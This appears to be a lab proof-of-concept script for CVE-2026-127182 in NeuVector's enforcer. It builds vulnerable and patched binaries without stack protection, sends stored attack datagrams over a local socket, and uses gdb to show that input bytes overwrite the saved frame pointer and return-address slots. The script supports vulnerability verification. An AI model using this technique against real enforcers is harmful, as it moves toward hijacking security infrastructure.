#!/usr/bin/env bash
# Plain (-O2, no ASan/fortify/stack-protector) frame readback for
# CVE-2026-127182. Builds the SAME pinned full 5.5.x enforcer dp as
# fulldp/run.sh, drives the REST-valid W274 datagram over the real AF_UNIX
# control socket, and reads the live post-overwrite saved RBP/return words
# under gdb for two wire-chosen pattern bytes. NOT rung 5: both chosen
# words are ASCII regex bytes and the process faults inside dpi_sig_bld()
# before returning. All provisioning stays under lab/; no external probe.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
die() { echo "FAIL $1"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
FIXED=$(readlink -f ../src/dpi_sig-fixed.c)
DEPS=$(readlink -f ../src/deps)
RLIB=$DEPS/root/usr/lib/x86_64-linux-gnu
OUT=$(pwd)/out
SOCK=/tmp/dp_listen.sock
ATTACK=$(readlink -f ../wirepath/out/wire-attack.json)
PATTACK=$(readlink -f ../wirepath/out/wire-B.json)
SAFE=$(readlink -f ../wirepath/out/wire-safe.json)

mkdir -p out "$DEPS/run" ../src/real
if [ ! -f "$ROOT/dp/dpi/sig/dpi_sig.c" ] || [ ! -f "$RLIB/libhs.so" ]; then
    echo "provisioning pinned tree and lab dev deps via fulldp/run.sh"
    bash run.sh > out/provision-fulldp.log 2>&1 || die "fulldp/run.sh provisioning"
fi
if [ ! -f "$ATTACK" ] || [ ! -f "$PATTACK" ] || [ ! -f "$SAFE" ]; then
    echo "provisioning wire messages via realcaller/run.sh + wirepath/run.sh"
    bash ../realcaller/run.sh > out/provision-realcaller.log 2>&1 && \
        bash ../wirepath/run.sh > out/provision-wirepath.log 2>&1 || \
        die "wire message provisioning"
fi

echo "== provenance =="
sha256sum "$ROOT/dp/dpi/sig/dpi_sig.c" "$FIXED" "$ATTACK" "$PATTACK" "$SAFE"
[ "$(sha256sum "$ROOT/dp/dpi/sig/dpi_sig.c" | cut -d' ' -f1)" = \
  1fbf0ba4aa731f8a92801002d2fe39141c2a88ea9a96d18507af47ae3303072b ] && \
    ok "pinned vulnerable enforcer source" || bad "pinned vulnerable enforcer source"
[ "$(sha256sum "$FIXED" | cut -d' ' -f1)" = \
  cc9d9c48ea07b015c7254946ab1c630f3aea2ce3a80d0042880b5cedaa284b08 ] && \
    ok "pinned fixed source" || bad "pinned fixed source"
[ "$(stat -c %s "$ATTACK")" = 2233 ] && [ "$(stat -c %s "$PATTACK")" = 2233 ] && \
    ok "both attack datagrams are REST-valid 2233-byte W274 messages" || \
    bad "both attack datagrams are REST-valid 2233-byte W274 messages"

echo "== build plain full dp, vulnerable and fixed =="
export PKG_CONFIG_PATH="$RLIB/pkgconfig"
CF="-Wall -Wno-unused-result -Wno-unused-function -fstrict-aliasing -g -O2 \
 -I$DEPS/root/usr/include -I$DEPS/root/usr/include/x86_64-linux-gnu \
 -I$DEPS/root/usr/include/hs -I$ROOT/dp -I$ROOT \
 $(pkg-config --cflags libnfnetlink libnetfilter_queue) \
 -fno-omit-frame-pointer -fno-stack-protector \
 -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0"
LF="-L$RLIB -Wl,-rpath,$RLIB -lpcap -lpcre2-8 -ljansson -ljemalloc -pthread \
 -lurcu -lurcu-cds -lrt -lstdc++ -lm -lnetfilter_queue -lnfnetlink -lmnl -lhs"
build_dp() { (cd "$ROOT" && make -B -C dp/dpi/sig CFLAGS="$CF" >/dev/null 2>&1 && \
                     make -B -C dp CFLAGS="$CF" EXTRA_LDFLAGS="$LF" >/dev/null 2>&1); }
SAVE=$DEPS/dpi_sig-frame-backup.c
cp "$ROOT/dp/dpi/sig/dpi_sig.c" "$SAVE"
restore() { cp "$SAVE" "$ROOT/dp/dpi/sig/dpi_sig.c"; }
trap restore EXIT
build_dp && cp "$ROOT/dp/dp" "$OUT/dp-plain-vuln" && \
    ok "full vulnerable enforcer dp builds at -O2 without ASan" || die "plain vulnerable build"
cp "$FIXED" "$ROOT/dp/dpi/sig/dpi_sig.c"
BIN=$(readlink -f "$OUT/dp-plain-vuln")
build_dp && cp "$ROOT/dp/dp" "$OUT/dp-plain-fixed" && \
    ok "full fixed-commit enforcer dp builds at -O2 without ASan" || die "plain fixed build"
restore; trap - EXIT
cmp -s "$SAVE" "$ROOT/dp/dpi/sig/dpi_sig.c" && ok "vulnerable pinned source restored" || bad "vulnerable pinned source restored"
! nm "$OUT/dp-plain-vuln" | grep -q __asan && ok "plain binary has no ASan runtime references" || bad "plain binary has no ASan runtime references"
nm "$OUT/dp-plain-vuln" | grep -q ' T dpi_sig_bld' && ok "binary exports dpi_sig_bld" || bad "binary exports dpi_sig_bld"

echo "== live plain-enforcer controls =="
run_case() {
    local bin="$1" msg="$2" name="$3"
    rm -f "$SOCK"
    (cd "$DEPS/run" && timeout 4 "$bin" -s -n 1 > "$OUT/$name.log" 2>&1; echo "RC=$?" >> "$OUT/$name.log") &
    local pid=$!
    for _ in $(seq 1 100); do [ -S "$SOCK" ] && break; sleep 0.1; done
    if [ ! -S "$SOCK" ]; then echo "FAIL consumer did not bind $SOCK"; fail=$((fail+1)); wait "$pid" 2>/dev/null || true; return 1; fi
    python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$SOCK" >> "$OUT/$name.sent" 2>&1 || true
    sleep 2
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK"
}
run_case "$OUT/dp-plain-vuln" "$ATTACK" plain-vuln-attack
run_case "$OUT/dp-plain-vuln" "$SAFE"   plain-vuln-safe
run_case "$OUT/dp-plain-fixed" "$ATTACK" plain-fixed-attack
has "$OUT/plain-vuln-attack.sent" "SENT bytes=2233" && ok "plain enforcer received the attack datagram" || bad "plain enforcer received the attack datagram"
grep -qE 'RC=(139|134|1)' "$OUT/plain-vuln-attack.log" && ok "plain vulnerable enforcer faults on the attack datagram" || bad "plain vulnerable enforcer faults on the attack datagram"
has "$OUT/plain-vuln-safe.log" "RC=" && ! grep -qE 'RC=(139|134)' "$OUT/plain-vuln-safe.log" && ok "safe datagram: plain vulnerable enforcer survives" || bad "safe datagram: plain vulnerable enforcer survives"
has "$OUT/plain-fixed-attack.log" "RC=" && ! grep -qE 'RC=(139|134)' "$OUT/plain-fixed-attack.log" && ok "fixed enforcer: attack datagram survives" || bad "fixed enforcer: attack datagram survives"
has "$OUT/plain-fixed-attack.log" "exceeds max sig len(2048)" && ok "fixed enforcer skips the oversized rule" || bad "fixed enforcer skips the oversized rule"

echo "== live post-overwrite frame read under gdb =="
frame_case() {
    local msg="$1" name="$2"
    rm -f "$SOCK" "$OUT/$name.sent"
    (for _ in $(seq 1 100); do [ -S "$SOCK" ] && break; sleep 0.1; done
     python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$SOCK") > "$OUT/$name.sent" 2>&1 &
    local sender=$!
    (cd "$ROOT" && timeout 25 gdb -q -batch \
        -ex 'set pagination off' \
        -ex 'break dpi_sig.c:662' \
        -ex 'run -s -n 1' \
        -ex 'printf "FRAME BUF=%p RBP=%p DELTA=%ld LEN=%d\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0]), len' \
        -ex 'printf "SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp+8)' \
        -ex 'x/24xb &dlpsig_buf[2040]' \
        -ex 'bt 2' \
        --args "$BIN" -s -n 1) > "$OUT/$name.log" 2>&1 || true
    wait "$sender" 2>/dev/null || true
    rm -f "$SOCK"
    grep -E 'Breakpoint|FRAME|SAVED|Program received|^0x7|dpi_sig_bld' "$OUT/$name.log" | head -10
}
frame_case "$ATTACK" plain-gdb-a
frame_case "$PATTACK" plain-gdb-B
for name in plain-gdb-a plain-gdb-B; do
    has "$OUT/$name.sent" "SENT bytes=2233" && ok "$name: datagram delivered to live enforcer" || bad "$name: datagram delivered to live enforcer"
    grep -qE 'FRAME BUF=[^ ]+ RBP=[^ ]+ DELTA=2096' "$OUT/$name.log" && \
        ok "$name: full-enforcer frame BUF-to-RBP delta 2096" || bad "$name: full-enforcer frame BUF-to-RBP delta 2096"
    has "$OUT/$name.log" 'received signal SIGSEGV' && has "$OUT/$name.log" 'at dpi_sig.c:657' && \
        ok "$name: chosen words read at the real in-loop fault" || bad "$name: chosen words read at the real in-loop fault"
done
grep -q 'SAVED slot0=0x2a2e612a2e612a2e slot1=0x2e612a2e612a2e61' "$OUT/plain-gdb-a.log" && \
    ok "a* wire patterns fill saved RBP and return slot in full enforcer" || bad "a* wire patterns fill saved RBP and return slot in full enforcer"
grep -q 'SAVED slot0=0x2a2e422a2e422a2e slot1=0x2e422a2e422a2e42' "$OUT/plain-gdb-B.log" && \
    ok "B* wire patterns replace both saved words in full enforcer" || bad "B* wire patterns replace both saved words in full enforcer"
! cmp -s <(grep '^SAVED ' "$OUT/plain-gdb-a.log") <(grep '^SAVED ' "$OUT/plain-gdb-B.log") && \
    ok "wire input controls live saved frame bytes" || bad "wire input controls live saved frame bytes"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
